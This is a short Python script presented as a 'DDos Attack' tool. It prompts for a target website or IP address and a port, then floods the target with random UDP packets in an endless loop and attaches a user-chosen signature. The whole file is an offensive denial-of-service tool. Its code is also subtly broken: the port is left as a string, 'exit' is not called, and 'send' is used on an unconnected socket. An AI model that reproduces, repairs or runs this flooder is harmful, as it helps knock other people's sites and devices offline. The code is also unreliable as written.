import socket
import os
import sys
import random

from datetime import datetime


#initialise the socket to use IPv4 & UDP protocole
sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("echo 'DDos Attack'")

victim = input("enter 'w' if your victim is a website, and 'l' if it's an electronic device : ")
if victim == 'w':
    host = input("Website you want to DDos: ")
    ip = socket.gethostbyname( host )
elif victim == 'l':
    ip = input("IP you want to DDos: ")
else :
    print("error !")
    exit

port = input("Port you want to attack: ")
pers_msg = input("Enter your personnal message or signatur if you wish: ")

os.system("clear")
os.system("echo 'DDos Attack starting...'")
while True:
    sockt.sendto(bytes,(ip,port))
    sockt.send(pers_msg)